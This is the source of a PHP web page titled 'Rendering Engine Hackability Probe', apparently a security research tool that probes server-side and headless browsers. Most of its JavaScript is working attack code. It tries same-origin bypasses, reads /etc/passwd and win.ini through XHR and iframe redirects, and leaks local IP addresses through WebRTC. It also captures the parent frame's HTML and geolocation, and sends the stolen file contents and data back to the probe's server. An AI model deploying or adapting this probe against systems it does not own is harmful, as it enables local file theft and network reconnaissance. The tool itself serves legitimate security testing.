<?php
require('inc/functions.inc.php');
$blind = isset($_GET['blind']) ? (int) $_GET['blind'] : 0;
$exploits = isset($_GET['exploits']) ? (int) $_GET['exploits'] : 1;
$logExploits = isset($_GET['logExploits']) ? (int) $_GET['logExploits'] : 1;
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<link href="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/css-link.css?info_css_link" rel="StyleSheet" />
<style>@import '<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/css-import.css?info_css_import';</style>
<script src="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>inspector/js/inspector.js"></script>
<script>
window.Hackability = {};
</script>
<script>
if (!document.querySelectorAll && !document.querySelector) {
	(function () {
		var
			style = document.createStyleSheet(),
			select = function (selector, maxCount) {
				var
					all = document.all,
					l = all.length,
					i,
					resultSet = [];

				style.addRule(selector, "foo:bar");
				for (i = 0; i < l; i += 1) {
					if (all[i].currentStyle.foo === "bar") {
						resultSet.push(all[i]);
						if (resultSet.length > maxCount) {
							break;
						}
					}
				}
				style.removeRule(0);
				return resultSet;

			};
		document.querySelectorAll = function (selector) {
			return select(selector, Infinity);
		};
		document.querySelector = function (selector) {
			return select(selector, 1)[0] || null;
		};
	}());
}
</script>
<script>
if(!Object.getOwnPropertyNames) {
	Object.getOwnPropertyNames = function(obj){
		var props = [];
		for(var i in obj) {
			props.push(i);
		}
		return props;
	};
}
</script>
<meta charset="UTF-8" />
<title>Rendering Engine Hackability Probe</title>
<style>
* {
	font-family: Arial;
}
iframe, object, embed {
	border:none;
	background-color: none;
}
th {
	text-align: left;
}
td {
	border-top: 1px solid grey;
	padding-top:15px;
}
table {
	  border-collapse: collapse;
}
.render {
	position: absolute;
	left:-5000px;
}
</style>
<script>
Hackability.makeRequest = function(type) {
	try {
		var script = document.createElement('script');
		script.src = Hackability.generateRequestUrl(type);
		document.body.appendChild(script);
	} catch(e){}
}
Hackability.generateRequestUrl = function(type) {
	return "<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tick.html?"+type+'&'+(+new Date);
}
</script>
</head>
<body>
<div class="container">
    <h1>Rendering Engine Hackability Probe</h1>
    <p>This page attempts to detect what technologies the client supports. You can find the source at <a href="https://github.com/PortSwigger/hackability">https://github.com/PortSwigger/hackability</a>. For further information, please refer to the whitepaper at <a href='http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html'>http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html</a></p>

		<h2>Supported query parameters</h2>
		<ul>
			<li>Render the JavaScript tests and save the result (off by default) - blind=1<br />Data can be retrieved from <a href="inspector/display.php">here</a>.</li>
			<li>Enable/Disable exploits (on by default) - exploits=1</li>
			<li>Log data from exploits (on by default) - logExploits=1</li>
		</ul>
<table>
  <tr>
    <td valign=top>
    	<table>
    		<thead>
    			<tr>
    				<th colspan=2>Basic tests</th>
    			</tr>
    		</thead>
    		<tbody>
    			<tr>
    			    <td width=50 height=51 valign=top class="css-link-detection" style="color:white"><div style="color:red;">No</div><span>Yes</span></td>
    				<td valign=top>CSS link?</td>
    			</tr>
    			<tr>
    			    <td width=50 height=51 valign=top class="css-import-detection" style="color:white"><div style="color:red">No</div><span>Yes</span></td>
    				<td valign=top>CSS imports?</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><span style="color:#ffffff;display:none">No</span><span style="color:green">Yes</span></td>
    				<td valign=top>Style attributes?</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><form><input type=checkbox checked></form></td>
    				<td valign=top>Forms supported?</td>
    			</tr>
    			<noscript>
    			<tr>
    				<td class="danger" width=50 height=51 valign=top><span style="color:red">No</span></td><td valign=top>Javascript enabled?</td>
    			</tr>
    			<link href="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tick.html?info_no_javascript&<?php echo time();?>" rel="StyleSheet" />
    			</noscript>
    			<script>
    			document.write('<tr><td class="info" width=50 height=51 valign=top><span style="color:green">Yes</span></td><td valign=top>JavaScript enabled</td></tr>');
    			Hackability.makeRequest("info_javascript");
    			</script>
    			<tr>
    			    <td width=50 height=51 valign=top><img src="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>img/tick.gif?info_img&<?php echo time();?>" alt="No" style="color:red;" /></td>
    				<td valign=top>Images enabled?</td>
    			</tr>
    			<!--[if IE]>
    			<tr><td class="info" width=50 height=51 valign=top><span style="color:green">Yes</span></td><td valign=top>Conditional comments</td></tr>
    			<![endif]-->
    			<tr>
    			    <td width=50 height=51 valign=top><iframe width="51" height="50" src="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tick.html?info_iframe&<?php echo time();?>" frameborder="0"><span style="color:red">No</span></iframe></td>
    				<td valign=top>Iframes render?</td>
    			</tr>
    			<tr>
  				<td width=50 height=51 valign=top><iframe width="51" height="50" frameborder="0" srcdoc="<body style=margin:0;padding:0><span style=color:green>Yes</span></body>"></iframe></td>
    				<td valign=top>Iframe srcdoc?</td>
    			</tr>
    			<tr>
    			    <td width=50 height=51 valign=top><object width="51" height="50" type="text/html" data="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tick.html?info_object&<?php echo time();?>" style="border:none;"><span style="color:red">No</span></object></td>
    				<td valign=top>Objects render?</td>
    			</tr>
    			<tr>
    			    <td width=50 height=51 valign=top><embed width="51" height="50" type="text/html" src="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tick.html?info_embed&<?php echo time();?>" style="border:0" border="0"></embed><noembed></noembed></td>
    				<td valign=top>Embeds render?</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><object data="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tick.html?info_activex&<?php echo time();?>" width=51 height=50 classid="clsid:25336920-03F9-11cf-8FD0-00AA00686F13">
      				<span style="color:red">No</span>
      				</object>
  				</td>
    				<td valign=top>ActiveX</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><object data="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>img/tick.swf?info_flash&<?php echo time();?>" width=11 height=10 type="application/x-shockwave-flash">
      				<param name="movie" value="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>img/tick.swf?info_flash&<?php echo time();?>" />
      				<span style="color:red">No</span>
      				</object>
  				</td>
    				<td valign=top>Flash</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><object data="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>img/tick.pdf?info_pdf&<?php echo time();?>" width=151 height=150 type="application/pdf">
      				<span style="color:red">No</span>
      				</object>
  				</td>
    				<td valign=top>PDF</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><applet width=151 height=150 codebase="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>img/" code="tick.class" width=151 height=150>
      				<span style="color:red">No</span>
      				</applet>
  				</td>
    				<td valign=top>Java</td>
    			</tr>
    		</tbody>
    	</table>
  </td>
  <td width=25>&nbsp;</td>
  <td width=1 style="border-left:1px solid #000">&nbsp;</td>
  <td width=25>&nbsp;</td>
<td valign=top>
  <table class="javascriptTests">
    		<thead>
    			<tr>
    				<th colspan=2>JavaScript tests</th>
    			</tr>
    		</thead>
    		<tbody>

    		</tbody>
    	</table>
  </td>
  </tr>
</table>
</div>
<div class="render"></div>
<script>
Hackability.generateRow = function(status, text, html) {
	var tbody = document.querySelector('.javascriptTests tbody'), tr, td, td2;
	tr = document.createElement('tr');
	td = document.createElement('td');
	td.width=50;
	td.height=51;
	td.valign="top";
	if(status) {
		td.innerHTML = '<span style="color:green">Yes</span>';
	} else {
		td.innerHTML = '<span style="color:red">No</span>';
	}
	td2 = document.createElement('td');
  if(html) {
    td2.innerHTML = html;
  } else {
    td2.appendChild(document.createTextNode(text));
  }
  tr.appendChild(td);
	tr.appendChild(td2);
	tbody.appendChild(tr);
}
</script>
<script>
!function(){
  var i, j, len = navigator.plugins.length, plugins = [], compare = ['Chromium PDF Viewer','WebKit built-in PDF','Edge PDF Viewer','Shockwave Flash','Widevine Content Decryption Module','Native Client','Chrome PDF Viewer'], found = false, diff = [];
  for(i=0;i<len;i++){
     plugins.push(navigator.plugins[i].name);
  }
  for(i=0;i<plugins.length;i++) {
    found = false;
    for(j=0;j<compare.length;j++) {
       if(plugins[i] === compare[j]) {
          found = true;
       }
    }
    if(!found) {
      diff.push(plugins[i]);
    }
  }
  if(diff.length) {
    Hackability.makeRequest("exploit_plugin_difference&props="+diff.join(','));
    Hackability.generateRow(true, "Plugin difference:"+diff.join(','));
  } else {
    Hackability.makeRequest("info_plugin_difference&props=No difference");
    Hackability.generateRow(false, "Plugin difference: none");
  }
}();
</script>
<script>
!function(){
  function escapeHTML(str) {
    str = str + '';
    return str.replace(/[<>'"\\&]/gi,function(c){return'&#'+c.charCodeAt(0)+';';});
  }
	function jsEnvironmentCheck() {
var props = Inspector.getKnownWindowProps().concat(['Inspector','Hackability']), foundProps = Object.getOwnPropertyNames(window), i, j, diff = [], found, html, links;
		for(i=0;i<foundProps.length;i++) {
			found = false;
			for(j=0;j<props.length;j++) {
				if(foundProps[i] === props[j]) {
					found = true;
					break;
				}
			}
			if(!found) {
				diff.push(foundProps[i]);
			}
		}

		if(diff.length) {
      html = 'JavaScript environment difference:';
      links = [];
			Hackability.makeRequest("exploit_js_environment_difference&props="+diff.join(','));
      if(diff.length) {
          for(i=0;i<diff.length;i++) {
            links.push('<a href="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>inspector/index.php?input='+escapeHTML(diff[i])+'">'+escapeHTML(diff[i])+'</a>');
          }
          Hackability.generateRow(true, "", "JavaScript environment difference:"+links.join(','));
      } else {
			     Hackability.generateRow(true, "JavaScript environment difference:"+diff.join(','));
      }
    } else {
			Hackability.makeRequest("info_js_environment_difference&props=No difference");
			Hackability.generateRow(false, "JavaScript environment difference: none");
		}
	}
	if(window.addEventListener) {
		window.addEventListener('load', function(){
			jsEnvironmentCheck();
		},false);
	} else if(window.attachEvent) {
		window.attachEvent('onload', function(){
			jsEnvironmentCheck();
		});
	}
}();
</script>
<script>
!function(){
  function escapeHTML(str) {
    str = str + '';
    return str.replace(/[<>'"\\&]/gi,function(c){return'&#'+c.charCodeAt(0)+';';});
  }
	function jsChromeCheck() {
var props = Inspector.getKnownChromeProps().concat(['Inspector','Hackability']), foundProps = Object.getOwnPropertyNames(window.chrome), i, j, diff = [], found, html, links;
		for(i=0;i<foundProps.length;i++) {
			found = false;
			for(j=0;j<props.length;j++) {
				if(foundProps[i] === props[j]) {
					found = true;
					break;
				}
			}
			if(!found) {
				diff.push(foundProps[i]);
			}
		}

		if(diff.length) {
      html = 'JavaScript chrome object difference:';
      links = [];
			Hackability.makeRequest("exploit_js_chrome_object_difference&props="+diff.join(','));
      if(diff.length) {
          for(i=0;i<diff.length;i++) {
            links.push('<a href="<?php echo htmlentities(getUrl(), ENT_QUOTES)?>inspector/index.php?input=window.chrome.'+escapeHTML(diff[i])+'">'+escapeHTML(diff[i])+'</a>');
          }
          Hackability.generateRow(true, "", "JavaScript chrome object difference:"+links.join(','));
      } else {
			     Hackability.generateRow(true, "JavaScript chrome object difference:"+diff.join(','));
      }
    } else {
			Hackability.makeRequest("info_js_chrome_object_difference&props=No difference");
			Hackability.generateRow(false, "JavaScript chrome object difference: none");
		}
	}
	if(window.addEventListener) {
		window.addEventListener('load', function(){
			jsChromeCheck();
		},false);
	} else if(window.attachEvent) {
		window.attachEvent('onload', function(){
			jsChromeCheck();
		});
	}
}();
</script>
<script>
!function(){
	function sopCheck() {
		var iframe = document.createElement('iframe');
		iframe.src = 'http://subdomain1.portswigger-labs.net';
		iframe.onload = function(){
			try {
				this.contentWindow.location.toString();
				Hackability.makeRequest("exploit_sop_disabled_iframe");
				Hackability.generateRow(true, "SOP bypassed");
			} catch(e){
				Hackability.makeRequest("info_sop_enabled_iframe");
				Hackability.generateRow(false, "SOP bypassed");
			}
		};
		document.querySelector('.render').appendChild(iframe);
	}
	sopCheck();
}();
</script>
<script>
!function(){
	Hackability.xhrCheck = function(url, type, info, msgTrue, msgFalse) {
		var req;
		if(window.XMLHttpRequest) {
			req = new XMLHttpRequest();
		} else {
			req = new ActiveXObject("Microsoft.XMLHTTP");
		}
		req.open("GET", url, true);
		req.onreadystatechange = function(){
			if(req.readyState === 4) {
				if(req.responseText.length) {
					<?php
					if($logExploits) {
							echo "Hackability.makeRequest(type+'&contents='+encodeURIComponent(req.responseText));";
					} else {
							echo "Hackability.makeRequest(type);";
					}
					?>

					Hackability.generateRow(true, msgTrue);
				} else {
					Hackability.makeRequest(info);
					Hackability.generateRow(false, msgFalse);
				}
			}
		};
		req.send(null);
	}

	try {
		Hackability.xhrCheck("http://subdomain1.portswigger-labs.net", "exploit_xdomain_xhr", "info_xhr_security_not_bypassed",
			"XHR security bypassed","XHR security not bypassed");
	} catch(e){
		Hackability.makeRequest("info_xhr_security_not_bypassed");
		Hackability.generateRow(false, "XHR security not bypassed");
	}
}();
</script>
<script>
!function(){
	var foundConstructor = false;
	function traverse(obj, depth, path) {
		var max = 3;
		for(var i in obj) {
			if(foundConstructor) {
				return false;
			}
			if(obj[i]===obj) {
				continue;
			}
			try {
				obj[i].constructor;
			} catch(e){
				if(/java/i.test(e)) {
					foundConstructor = true;
					Hackability.makeRequest("exploit_java_bridge&exception="+encodeURIComponent(e));
					Hackability.generateRow(true, "Java Bridge exists:exception="+e);
					return false;
				}
			}
			if(obj[i] && typeof obj[i] === 'object')
			try {
				obj[i].getClass().forName("java.net.Socket").newInstance();
				foundConstructor = true;
				Hackability.makeRequest("exploit_java_bridge&class="+encodeURIComponent(obj[i].getClass().getName()));
				Hackability.generateRow(true, "Java Bridge exists:class="+obj[i].getClass().getName()+', path='+path+'.'+i);
				return false;
			} catch(e){}

			try {
				if(obj[i] && depth < max) {
					traverse(obj[i], depth+1, path + '.' + i);
				}
			} catch(e){}
		}
	}
	if(window.addEventListener) {
		window.addEventListener('load', function(){
			traverse(window, 0, 'window');
			if(!foundConstructor) {
				Hackability.makeRequest("info_no_java_bridge");
				Hackability.generateRow(false, "Java Bridge does not exist");
			}
		},false);
	} else if(window.attachEvent) {
		window.attachEvent('onload', function(){
			traverse(window, 0, 'window');
			if(!foundConstructor) {
				Hackability.makeRequest("info_no_java_bridge");
				Hackability.generateRow(false, "Java Bridge does not exist");
			}
		});
	}
}();
</script>
<script>
if(window.callPhantom) {
	Hackability.makeRequest("info_call_phantom_exists");
	Hackability.generateRow(true, "PhantomJS detected");
} else {
	Hackability.makeRequest("info_call_phantom_does_not_exist");
	Hackability.generateRow(false, "PhantomJS not detected");
}
</script>
<script>
if(location.hostname !== '<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?>') {
	Hackability.makeRequest("info_different_location&url="+encodeURIComponent(location));
	Hackability.generateRow(false, "Is at a different location. url="+url);
} else {
	Hackability.makeRequest("info_same_location");
	Hackability.generateRow(false, "Is not at a different location");
}
</script>
<script>
!function(){
	var canSvg = !!(document.createElementNS && document.createElementNS('http://www.w3.org/2000/svg','svg').createSVGRect);
	if(canSvg) {
		Hackability.makeRequest("info_svg_is_supported");
		Hackability.generateRow(true, "SVG is supported");
	} else {
		Hackability.makeRequest("info_svg__is_not_supported");
		Hackability.generateRow(false, "SVG is not supported");
	}
}();
</script>
<script>
if(Object.defineProperty) {
	Hackability.makeRequest("info_es5_is_supported");
	Hackability.generateRow(true, "ES5 is supported");
} else {
	Hackability.makeRequest("info_es5_is_not_supported");
	Hackability.generateRow(false, "ES5 is not supported");
}
</script>
<script>
!function(){
	try {
		eval("class x{}");
		Hackability.makeRequest("info_es6_is_supported");
		Hackability.generateRow(true, "ES6 is supported");
	} catch(e){
		Hackability.makeRequest("info_es6_is_not_supported");
		Hackability.generateRow(false, "ES6 is not supported");
	}
}();
</script>
<script>
if(!'a'[0]) {
	Hackability.makeRequest("info_older_ie");
	Hackability.generateRow(true, "Older IE detected");
}
</script>
<script>
if('\u' === 'u') {
	Hackability.makeRequest("info_safari_like");
	Hackability.generateRow(true, "Safari like behaviour");
}
</script>
<script>
if(window.Components) {
	Hackability.makeRequest("info_mozilla_like");
	Hackability.generateRow(true, "Mozilla like behaviour");
}
</script>
<script>
!function(){
	if(top.location != self.location) {
		var loc = '', contents = '';
		try {
			loc = top.location;
		} catch(e){}
		try {
			contents = top.document.documentElement.innerHTML;
		} catch(e){}
		Hackability.generateRow(true, "Is Iframed");
		Hackability.makeRequest("info_framed&location="+encodeURIComponent(loc)+'&contents='+encodeURIComponent(contents));
	} else {
		Hackability.generateRow(false, "Is not iframed");
	}
}();
</script>
<script>
!function(){
	if(window.opener) {
		var loc = '';
		try {
			loc = window.opener.location;
		} catch(e){}
			Hackability.makeRequest("info_opener&location="+encodeURIComponent(loc));
			Hackability.generateRow(true, "Page opened from another window");
		try {
			window.opener.location = Hackability.generateRequestUrl('info_opener_redirection');
		} catch(e){}
	}
}();
</script>
<script>
if(location.origin && location.origin === 'null') {
	Hackability.makeRequest("info_iframe_sandboxed");
	Hackability.generateRow(true, "Page is iframed sandboxed");
} else {
	Hackability.generateRow(false, "Page is not iframed sandboxed");
}
</script>
<script>
!function(){
	var win = window.open(Hackability.generateRequestUrl('info_popups'));
	if(win) {
		Hackability.generateRow(true, "Popups are allowed");
	} else {
		Hackability.generateRow(false, "Popups are not allowed");
	}
	if(win)win.close();
}();
</script>
<iframe class="iframe_webrtc" sandbox="allow-same-origin" style="display: none"></iframe>
<script>
!function(){
	//get the IP addresses associated with an account
	function getIPs(callback){
	    var ip_dups = {};

	    //compatibility for firefox and chrome
	    var RTCPeerConnection = window.RTCPeerConnection
	        || window.mozRTCPeerConnection
	        || window.webkitRTCPeerConnection;
	    var useWebKit = !!window.webkitRTCPeerConnection;

	    //bypass naive webrtc blocking using an iframe
	    if(!RTCPeerConnection){
	        //NOTE: you need to have an iframe in the page right above the script tag
	        //
	        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
	        //<script>...getIPs called in here...
	        //
	        var win = document.querySelector('.iframe_webrtc').contentWindow;
	        RTCPeerConnection = win.RTCPeerConnection
	            || win.mozRTCPeerConnection
	            || win.webkitRTCPeerConnection;
	        useWebKit = !!win.webkitRTCPeerConnection;
	    }

	    //minimal requirements for data connection
	    var mediaConstraints = {
	        optional: [{RtpDataChannels: true}]
	    };

	    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
	    if(!RTCPeerConnection) {
	    	return;
	    }
	    //construct a new RTCPeerConnection
	    var pc = new RTCPeerConnection(servers, mediaConstraints);

	    function handleCandidate(candidate){
	        //match just the IP address
	        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
	        var ip_addr = ip_regex.exec(candidate)[1];

	        //remove duplicates
	        if(ip_dups[ip_addr] === undefined)
	            callback(ip_addr);

	        ip_dups[ip_addr] = true;
	    }

	    //listen for candidate events
	    pc.onicecandidate = function(ice){

	        //skip non-candidate events
	        if(ice.candidate)
	            handleCandidate(ice.candidate.candidate);
	    };

	    //create a bogus data channel
	    pc.createDataChannel("");

	    //create an offer sdp
	    pc.createOffer(function(result){

	        //trigger the stun server request
	        pc.setLocalDescription(result, function(){}, function(){});

	    }, function(){});

	    //wait for a while to let everything done
	    setTimeout(function(){
	        //read candidate info from local description
	        var lines = pc.localDescription.sdp.split('\n');

	        lines.forEach(function(line){
	            if(line.indexOf('a=candidate:') === 0)
	                handleCandidate(line);
	        });
	    }, 1000);
	}
	getIPs(function(ip){
	    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
	    	Hackability.makeRequest("exploit_local_ip&ip="+encodeURIComponent(ip));
	    	Hackability.generateRow(true, "Local IP detected:"+ip);
	    } else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) {
	        Hackability.makeRequest("exploit_local_ip&ip="+encodeURIComponent(ip));
	        Hackability.generateRow(true, "Local IP detected:"+ip);
	    } else {
	    	Hackability.generateRow(false, "Local IP could not be obtained");
	    }
	});
}();
</script>
<script>
Hackability.iframe_handler = function(iframe, type, msg){
	function isInterestingUrl(url) {
    var a = document.createElement('a');
    try {
      url = url + '';
		} catch(e){
      return true;
    }
    a.href = url;
		return url !== 'about:blank' && url !== '' && a.host !== '<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?>';
	}
	var contents = '', url = '';
	try {
		url = iframe.contentWindow.location+'';
	} catch(e){
    url = '';
  }
	try {
		contents = iframe.contentWindow.document.documentElement.innerHTML+'';
	} catch(e){
    contents = '';
  }
	if(!/IGNORE THIS CONTENTS/i.test(contents) && isInterestingUrl(url) && contents.length) {
		<?php
		if($logExploits) {
			echo "Hackability.makeRequest(type+'?&url='+encodeURIComponent(url)+'&contents='+encodeURIComponent(contents));";
		} else {
			echo "Hackability.makeRequest(type+'?&url='+encodeURIComponent(url));";
		}
		?>
		Hackability.generateRow(true,msg+':url='+url+', contents='+contents);
	}
};
</script>
<script>
Hackability.print = function(){
  function afterPrint() {
      Hackability.makeRequest("info_allows_printing");
      Hackability.generateRow(true,"Allows printing");
  }
  if (window.matchMedia) {
      var mediaQueryList = window.matchMedia('print');
      mediaQueryList.addListener(function(mql) {
          if(!mql.matches) {
              afterPrint();
          }
      });
  } else {
    window.onafterprint = afterPrint;
  }
  window.print();
};
</script>
<script>
if(navigator.geolocation && navigator.geolocation.getCurrentPosition) {
  navigator.geolocation.getCurrentPosition(function(position) {
    Hackability.makeRequest("info_geolocation&lat="+position.coords.latitude+"&long="+position.coords.longitude);
    Hackability.generateRow(true, "Geo location allowed:lat="+position.coords.latitude+"&long="+position.coords.longitude);
  });
}
</script>
<script>
Hackability.createIframe = function(src, msg, type){
	var iframe = document.createElement('iframe');
	iframe.src = src;
	iframe.onreadystatechange = iframe.onload = function(){
		Hackability.iframe_handler(this, type, msg);
	};
	document.body.appendChild(iframe);
};
</script>
<script>
Hackability.runExploits = function() {
  var q = [];
	try {
		Hackability.xhrCheck("file://etc/passwd", "exploit_linux_filesystem_xhr", "info_xhr_security_linux_not_bypassed",
			"XHR security filesystem linux bypassed","XHR security filesystem linux not bypassed");
	} catch(e){
		Hackability.makeRequest("info_xhr_security_filesystem_linux_not_bypassed");
		Hackability.generateRow(false, "XHR security filesystem linux not bypassed");
	}
	try {
		Hackability.xhrCheck("c:\\windows\\win.ini", "exploit_windows_filesystem_xhr", "info_xhr_security_windows_not_bypassed",
			"XHR security filesystem windows bypassed","XHR security filesystem windows not bypassed");
	} catch(e){
		Hackability.makeRequest("info_xhr_security_filesystem_windows_not_bypassed");
		Hackability.generateRow(false, "XHR security filesystem windows not bypassed");
	}
  q.push(function(){
    try {
      Hackability.createIframe('file:c:\\windows\\win.ini', 'Iframe security filesystem windows bypassed', 'exploit_local_file_iframe_windows');
    } catch(e){console.log(e);}
  });
	q.push(function(){
	 try {
    Hackability.createIframe('file://etc/passwd', 'Iframe security filesystem linux bypassed', 'exploit_local_file_iframe_linux');
   } catch(e){console.log(e);}
	});
  q.push(function(){
    try {
      Hackability.createIframe('<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/redirect.php?redirectType=http&os=windows','Iframe security filesystem windows redirect bypassed','exploit_local_file_iframe_redirect_windows');
    } catch(e){console.log(e);}
	});
  q.push(function(){
    try {
      Hackability.createIframe('<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/redirect.php?redirectType=http&os=linux','Iframe security filesystem linux redirect bypassed','exploit_local_file_iframe_redirect_linux');
    } catch(e){console.log(e);}
	});
  q.push(function(){
    try {
      Hackability.createIframe('<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/redirect.php?redirectType=meta&os=windows','Iframe security filesystem windows meta redirect bypassed','exploit_local_file_iframe_redirect_windows');
    } catch(e){console.log(e);}
	});
  q.push(function(){
    try {
      Hackability.createIframe('<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/redirect.php?redirectType=meta&os=linux','Iframe security filesystem linux meta redirect bypassed','exploit_local_file_iframe_redirect_linux');
    } catch(e){console.log(e);}
	});
  q.push(function(){
    try {
      Hackability.createIframe('<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/redirect.php?redirectType=javascript&os=windows','Iframe security filesystem windows js redirect bypassed','exploit_local_file_iframe_redirect_windows');
    } catch(e){console.log(e);}
	});
  q.push(function(){
    try {
      Hackability.createIframe('<?php echo htmlentities(getUrl(), ENT_QUOTES)?>tests/redirect.php?redirectType=javascript&os=linux','Iframe security filesystem linux js redirect bypassed','exploit_local_file_iframe_redirect_linux');
    } catch(e){console.log(e);}
  });
  setTimeout(function f(){
      if(q.length) {
        try {
          q.shift()();
        } catch(e){}
        setTimeout(f, 1500);
      }
  }, 1500);
};
</script>
<script>
!function(){
	function saveResults() {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '<?php echo htmlentities(getUrl(), ENT_QUOTES)?>inspector/save.php', true);
		xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
		xhr.send('objName='+encodeURIComponent('Hackability capability check')+'&html='+encodeURIComponent(document.querySelector('.javascriptTests').parentNode.innerHTML));
	}
	if(window.addEventListener) {
		window.addEventListener('load', function(){
			<?php if($blind){
					echo 'saveResults();';
			}
			?>
			setTimeout(function(){
				<?php if($exploits){
					echo 'Hackability.runExploits();';
				}
				?>
	      Hackability.print();
			}, 5000);
		}, false);
	} else if(window.attachEvent) {
		window.attachEvent('onload', function(){
			<?php if($blind){
					echo 'saveResults();';
			}
			?>
			setTimeout(function(){
				<?php if($exploits){
					echo 'Hackability.runExploits();';
				}
				?>
	      Hackability.print();
			}, 5000);
		});
	}
}();
</script>
</body>
</html>
